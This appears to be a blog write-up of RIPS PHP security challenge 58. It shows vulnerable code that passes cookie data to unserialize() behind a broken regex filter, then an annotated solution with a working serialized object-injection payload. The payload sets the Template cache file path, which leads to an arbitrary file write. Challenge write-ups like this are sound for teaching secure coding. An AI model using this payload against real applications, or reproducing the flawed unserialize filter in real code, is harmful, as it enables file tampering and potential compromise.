---

title: rips-58
author: raxjs
tags: [php]

---

Welcome back cachefile.

<!--more-->
{{< reference src="https://twitter.com/ripstech/status/1169997998924980224" >}}

# Code
{{< code language="php"  title="Challenge" expand="Show" collapse="Hide" isCollapsed="false" >}}
class Template {
    public $cacheFile = '/tmp/cachefile';
    public $template = '<div>Welcome back %s</div>';

    public function __construct($data = null) {
        $data = $this->loadData($data);
        $this->render($data);
    }

    public function loadData($data) {
        if(substr($data, 0, 2) !== 'O:'
           && !preg_match('/O:\d:\/', $data)) {
            return unserialize($data);
        }
        return [];
    }

    public function createCache($file = null, $tpl = null) {
        $file = $file ?? $this->cacheFile;
        $tpl= $tpl ?? $this->template;
        file_put_contents($file, $tpl);
    }

    public function render($data) {
        echo sprintf(
            $this->template,
            htmlspecialchars($data['name'])
        );
    }

    public function __destruct() {
        $this->createCache();
    }
}

new Template($_COOKIE['data']);

{{< /code >}}

# Solution
{{< code language="php" highlight="7,14,16,40" title="Solution" expand="Show" collapse="Hide" isCollapsed="true" >}}
class Template {
    public $cacheFile = '/tmp/cachefile';
    public $template = '<div>Welcome back %s</div>';

    public function __construct($data = null) {
		// 2) user input $data
        $data = $this->loadData($data);
        $this->render($data);
    }

    public function loadData($data) {
        if(substr($data, 0, 2) !== 'O:'
			// 3) this can be bypassed with ['name' => 'f00', 'obj' => new Template(...)]
           && !preg_match('/O:\d:\/', $data)) {
			// 4) user controlled data into unserialize
            return unserialize($data);
        }
        return [];
    }

    public function createCache($file = null, $tpl = null) {
        $file = $file ?? $this->cacheFile;
        $tpl= $tpl ?? $this->template;
        file_put_contents($file, $tpl);
    }

    public function render($data) {
        echo sprintf(
            $this->template,
            htmlspecialchars($data['name'])
        );
    }

    public function __destruct() {
        $this->createCache();
    }
}

// 1) user input from cookie
new Template($_COOKIE['data']);


// example:
$x = 'a:1:{s:4:"name";s:3:"f00";}';
//$o = ['name' => 'f00', 'obj' => new Template($x)];
//echo serialize($o);
$payload = 'a:2:{s:4:"name";s:3:"f00";s:3:"obj";O:8:"Template":2:{s:9:"cacheFile";s:15:"/tmp/cachefile2";s:8:"template";s:26:"<div>Welcome back %s</div>";}}';
//                                                                                                    ^
//                                                                                                    |
//                                                                                            change file name

var_dump(preg_match('/O:\d\/', 'a:2:{s:4:"name";s:3:"f00";s:3:"obj";O:8:"Template":2:{s:9:"cacheFile";s:15:"/tmp/cachefile2";s:8:"template";s:26:"<div>Welcome back %s</div>";}}'));
//                        ^
//                        |
// PHP Warning:  preg_match(): No ending delimiter '/' found in php shell code on line 1
// bool(false)

var_dump(preg_match('/O:\d/', 'a:2:{s:4:"name";s:3:"f00";s:3:"obj";O:8:"Template":2:{s:9:"cacheFile";s:15:"/tmp/cachefile2";s:8:"template";s:26:"<div>Welcome back %s</div>";}}'));
// int(1)

{{< /code >}}
